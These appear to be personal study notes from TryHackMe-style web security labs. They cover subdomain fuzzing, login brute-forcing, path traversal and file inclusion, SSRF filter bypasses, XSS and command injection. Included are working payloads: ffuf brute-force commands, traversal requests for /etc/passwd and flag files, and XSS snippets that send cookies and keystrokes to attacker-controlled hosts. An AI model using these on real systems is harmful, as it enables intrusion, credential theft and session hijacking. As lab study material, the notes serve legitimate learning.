# Notes

Search for a favicon to find what framework is being used with the below command and look up the hash within the following page

```
https://wiki.owasp.org/index.php/OWASP_favicon_database
```

```
curl <path to favicon file> | md5sum
```

## Check what frameworks websites uses

```
https://www.wappalyzer.com/
```

## Look for certs for things like ssl

```
https://crt.sh/
```
## Sub Domain Enumeration

### Brute force dns

```
dnsrecon
```

### Subdomain discovery

```
https://github.com/aboul3la/Sublist3r
```

### virtual hosts

* this is needed for the tasks

```
Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 
```



```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
```

```
The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.
```

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.219.232 -fs 2395
```

## Authentication Bypass

* from the website we know if tells you if a user with that username has already been made so you can fuzz to get a list of valid usernames.

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.39.178/customers/signup -mr "username already exists"
```

### Brute force

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.39.178/customers/login -fc 200
```

### Logic flaw

* When the logic of an authentication method can be bypassed, circumvented or manipulated.

```
curl 'http://10.10.39.178/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=Bytekage@customer.acmeitsupport.thm'
```

### Cookies

```
curl -H "Cookie: logged_in=true; admin=true" http://10.10.39.178/cookie-test
```

* crack stations is an online site to crack hashes

```
echo VEhNe0JBU0U2NF9FTkNPRElOR30= | base64 --decode
echo '{"id":1,"admin":true}' | base64
```

## IDOR (INSECURE DIRECT OBJECT REFERENCE)

* caused from when server gets user supplied input to retrieve things like files, but no validation is done to tell if the user has access or owns these objects

* A good way to test with unpredictable ids is to make 2 accounts and swap the ids to see if you can view the item when you're logged into a different account

* You can sometimes see the query in the network tab for an api call getting user data. Try and change the number to see if you get anything.

## File Inclusion

* LFI -> Local file inclusion
* RFI -> Remote file inclusion

* Occurs when user input isn't sanatised or validated

### Path Traversal (dot-dot-slash attack)

* Allows attacker to read operating system resources such as local files on the server. Abuses the web apps url to locate and read files or directories.
* Normally happens cause of poor sanitation and use of the ***file_get_contents*** php function.


```
Location	Description

/etc/issue
	contains a message or system identification to be printed before the login prompt.

/etc/profile
	

controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

/proc/version
	specifies the version of the Linux kernel

/etc/passwd
	has all registered user that has access to a system

/etc/shadow
	contains information about the system's users' passwords

/root/.bash_history
	

contains the history commands for root user

/var/log/dmessage
	contains global system messages, including the messages that are logged during system startup

/var/mail/root
	

all emails for root user

/root/.ssh/id_rsa
	Private SSH keys for a root or any known valid user on the server

/var/log/apache2/access.log
	

the accessed requests for Apache  webserver

C:\boot.ini
	contains the boot options for computers with BIOS firmware

```

### LFI

```
With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications
```
 * to find what is specified in the include path you can put in a bad input and read the error.

 * if something is being added to the end of your input such as .php you can get the web app to ignore this by adding a null byte

```
%00 or 0x00 
"languages/../../../../../etc/passwd%00"
NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
```

examples from how I got answers

```
http://10.10.65.208/lab6.php?file=THM-profile/../../../../etc/os-release%00

lab3.php?file=../../../../etc/passwd%00
```

### RFI

* again from bad sanitation and allows for an atacker to inhect an external url into include.
* Requirements is that allopw)url_fopen option needs to be on.
* Other consequences of RFI are:
    * Sensitive information Discolsure
    * Cross-site Scripting
    * Denial of Service

### Remediation

```

    Keep system and services, including web application frameworks, updated with the latest version.
    Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
    A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
    Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
    Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
    Never trust user input, and make sure to implement proper input validation against file inclusion.
    Implement whitelisting for file names and locations as well as blacklisting.
```

### Challenges

#### Challenge one

Using burp put the following in a repeater

```
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.65.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer:
http://10.10.65.208/challenges/chall1.php?file=..%2F..%2F..%2F..%2Fetc%2Fflag1
Cookie: THM=Guest
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

file=../../../../etc/flag1
```

#### Challenge two

The page uses the cookie to display content so

```
GET /challenges/chall2.php HTTP/1.1
Host: 10.10.65.208
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: THM=../../../../etc/flag2%00
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

#### Challenge three

Just need a post request

```
curl -X POST 10.10.65.208/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
```

#### Challenge four (RFI)

```
10.10.65.208/playground.php?file=http://<my-ip>:8000/cmd.txt
```

## SSRF (Server Side Request Forgery)

* Allows the attacker to cause the webserver to make an additional or edited http request to the resource of the attacker's choosing.
* Two types:
    * Normal -> data returned to attackers screen
    * Blind -> no information is returned
* Attacks can lead to:

```
    Access to unauthorised areas.
    Access to customer/organisational data.
    Ability to Scale to internal networks.
    Reveal authentication tokens/credentials.
```
Example One:

```
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
```

Ways to spot:
    * Full Url in the parameter addresss
    * A partial url just for the host name
    * Just the path of the url

requestbin.com -> When there is no output coming back to you, this can be used to log what the url becomes (can also use burp)

Defence:

```
Deny List

A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.


Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.


Allow List

An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
```

To do the pactical change the value of the avatar to 

```
x/../private
```

this will change your icon to have the encoded flag

## XXS (Cross-Site Scripting)

Examples from the site on how XSS is exploited

```
Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:


<script>alert('XSS');</script>


Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.


<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>


Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.


<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>


Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:


<script>user.changeEmail('attacker@hacker.thm');</script>


Now that the email address for the account has changed, the attacker may perform a reset password attack.

```

### Reflected XSS

* This is when the user's supplied data in a HTTP request is included in the webpage source without any validation

Points of entry

```
Parameters in the URL Query String
URL File Path
Sometimes HTTP Headers (although unlikely exploitable in practice)
```

### Stored XSS

* Stored in the webapp, for eg in the db, and will execute when someone hits the site.

Points of entry

```
Comments on a blog
User profile information
Website Listings
```

Good example

```
 for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

```

### DOM XSS

* When JS execution happens directly from within the browser without any new pages being loaded

how to exploit

```
The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.


When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
```

### Blind XSS

* Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

```
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
```

### Types of XSS

```
<script>alert('THM');</script>

"><script>alert('THM');</script>

</textarea><script>alert('THM');</script>

';alert('THM');//

<sscriptcript>alert('THM');</sscriptcript>

/images/cat.jpg" onload="alert('THM');

```

#### Polygots:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

#### Practice

```
</textarea><script>fetch('http://10.4.28.132:9001?cookie=' + btoa(document.cookie) );</script>
</textarea><script>fetch('http://c3ac354fddd44cad6846712677407ff5.log.tryhackme.tech?cookie=' + btoa(document.cookie) );</script>
```

## Command injections

* 2 Types:
  * Bind: This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.
  * This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the whoami command to see what user the application is running under. The web application will output the username on the page directly.

```
Bypassing Filters

Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.

When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.
```